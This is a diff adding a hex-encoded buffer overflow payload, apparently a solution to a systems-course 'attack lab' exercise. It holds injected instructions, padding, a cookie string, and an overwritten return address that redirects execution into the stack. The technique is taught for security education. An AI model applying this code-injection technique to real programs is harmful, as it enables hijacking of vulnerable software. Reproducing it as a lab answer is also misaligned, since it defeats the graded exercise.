@@ -1,0 +1,8 @@
+48 c7 c7 38 05 62 55        /* mov    $0x55620538,%rdi */
+68 32 1a 40 00              /* pushq  $0x401a32 */
+c3 11 11 11 11              /* ret */
+22 22 22 22 33 33 33 33     /* normal content for padding */
+44 44 44 44 55 55           /* normal content for padding */
+34 63 39 32 61 65 36 38 00  /* hex representation for cookie: 0x4c92ae68 */
+08 05 62 55 00 00 00 00     /* return address: 0x55620508 */
+34 63 39 32 61 65 36 38 00  /* hex representation for cookie: 0x4c92ae68 */
